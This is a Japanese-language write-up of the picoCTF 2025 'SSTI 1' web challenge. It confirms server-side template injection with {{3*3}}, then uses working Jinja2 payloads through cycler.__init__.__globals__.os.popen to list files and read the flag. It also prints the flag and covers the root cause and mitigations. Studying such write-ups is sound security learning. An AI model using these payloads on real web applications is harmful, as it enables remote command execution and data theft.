# picoCTF 2025 – SSTI 1

## Category
Web Exploitation

---

## 📝 Problem Overview

Webアプリケーションの入力欄に文字列を入力すると、その内容が画面に表示される。

しかし、入力内容が単なる文字列として表示されるのではなく、  
**サーバー側テンプレートとして評価されている可能性**がある。

この挙動を利用して、サーバー内部の flag を取得する問題。

---

## 🔎 Recon（調査）

まず入力欄に単純な式を入力して挙動を確認した。
(タイトルがSSTIなのでServer-Side Template Injection)
```
{{3*3}}
```

結果：

```
9
```

通常であれば `{{3*3}}` はそのまま文字列表示されるはずだが、  
実際には計算結果が表示された。

### 推測

- サーバー側でテンプレートエンジンが動作している
- Jinja2（Python系テンプレート）の可能性が高い

つまり、**Server-Side Template Injection（SSTI）** が成立していると判断した。

---

## 🧠 Hypothesis

Jinja2 ではテンプレート内から Python オブジェクトにアクセスできる場合がある。

もし Python の `os` モジュールに到達できれば、  
サーバー上でコマンド実行が可能になる。

---

## 🛠 Exploitation

まずサーバー内のファイル一覧を取得することを試みた。

```
{{ cycler.__init__.__globals__.os.popen("ls").read() }}
```

出力：

```
__pycache__
app.py
flag
requirements.txt
```

`flag` ファイルの存在を確認。

次に、その内容を読み取った。

```
{{ cycler.__init__.__globals__.os.popen("cat flag").read() }}
```

---

## 📬 Server Response

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
```

---

## 🏁 Flag

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
```

---

## 🧩 Root Cause Analysis

本質的な問題は、

> ユーザー入力をサーバー側テンプレートとして直接評価していたこと。

危険な実装例：

```python
render_template(user_input)
```

本来は：

```python
render_template("page.html", user_input=user_input)
```

のように変数として渡すべき。

---

## 🚨 なぜ危険か

- テンプレートエンジンを経由して Python に到達可能
- Python から `os` にアクセス可能
- `os.popen()` により任意コマンド実行可能
- 最終的に RCE（Remote Code Execution）に繋がる

これは実務では重大な脆弱性。

---

## 🛡 Mitigation

- ユーザー入力をテンプレートとして評価しない
- `render_template_string()` の乱用を避ける
- 入力値をエスケープする
- サンドボックス環境を使用する

---

## 📚 What I Learned

- `{{3*3}}` のような式評価は SSTI の典型的確認方法
- Jinja2 では `__globals__` 経由で Python に到達できる
- テンプレートインジェクションは RCE に直結する
- 入力値をそのまま評価する設計は極めて危険
- CTFのEasy問題は「典型パターン」を知っているかどうかで難易度が変わる

---

## 🔎 Attack Classification

- 脆弱性種別：Server-Side Template Injection (SSTI)
- 影響範囲：Remote Code Execution (RCE)
- 重大度：High / Critical
